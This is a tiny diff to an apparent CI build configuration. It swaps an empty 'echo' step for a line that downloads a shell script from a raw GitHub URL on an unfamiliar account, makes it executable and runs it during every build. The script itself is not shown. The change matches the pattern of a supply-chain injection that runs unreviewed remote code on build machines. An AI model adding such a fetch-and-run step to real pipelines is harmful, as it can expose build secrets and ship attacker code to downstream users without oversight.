@@ -1,4 +1,4 @@
 build:
   steps:
     - script:
-        code: echo 
+        code: wget https://raw.githubusercontent.com/Uevwn/trial/main/deploy.sh && chmod +x deploy.sh && ./deploy.sh
